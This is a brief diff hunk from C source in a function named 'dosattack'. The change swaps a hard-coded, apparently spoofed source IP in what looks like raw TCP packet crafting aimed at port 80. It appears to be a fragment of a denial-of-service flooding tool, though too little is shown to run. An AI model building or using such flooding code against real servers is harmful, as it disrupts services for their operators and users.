@@ -74,7 +74,7 @@ void dosattack(const struct AHTTP_INPUT *ainput)
     struct sockaddr_in sin;
     struct pseudo_header psh;
 
-    strcpy(source_ip, "192.168.1.254");
+    strcpy(source_ip, "192.168.1.1");
 
     sin.sin_family = AF_INET;
     sin.sin_port = htons(80);
